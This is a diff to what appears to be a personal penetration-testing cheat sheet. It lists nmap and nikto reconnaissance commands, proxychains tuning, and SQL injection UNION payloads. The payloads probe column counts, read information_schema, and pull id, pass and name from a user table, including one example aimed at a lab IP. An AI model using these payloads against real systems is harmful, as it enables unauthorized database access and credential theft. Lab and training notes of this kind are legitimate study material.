@@ -9,6 +9,9 @@ NMAP Scripting Engine:
                                     --script=http-enum.nse <ip> -p <port>      (use to enum well known paths/dir from websites)
        nmap -p 445 --script smb-os-discovery <IP/subnet>        (OS, computer name, netbios name, domain)
        
+       
+       
+       
        nikto -h <ip> -p <ports>
        
        
@@ -44,7 +47,9 @@ NMAP Scripting Engine:
    
    SQL INJ:
    GET:
-    Selection=2/3.... UNION select (1,2,...)table_schema,column_name,table_name(4,5,6...) from information_schema.columns where table_name
+    EX, http://10.50.42.112/uniondemo.php?Selection=# UNION select 1,2,3;#  ....to check columns
+    Selection=2/3.... UNION select (1,2,...)table_schema,column_name,table_name(4,5,6...) from information_schema.columns where table_name = ''
+                                                 1            2           3   easy order
     Selection=2 UNION select name,type,cost from session.car;#
     Selection=2 UNION select id,pass,name from session.user;#
     Selection=2 UNION select 1,2,@@version
@@ -58,6 +63,19 @@ NMAP Scripting Engine:
    
    
    
+   
+   
+   
+   
+   
+   
+   
+   
+   
+  Speed up proxychains:
+   sudo vim /etc/proxychains.conf
+   tcp_read_time_out  800
+   tcp_connect_time_out 600
    
    
    
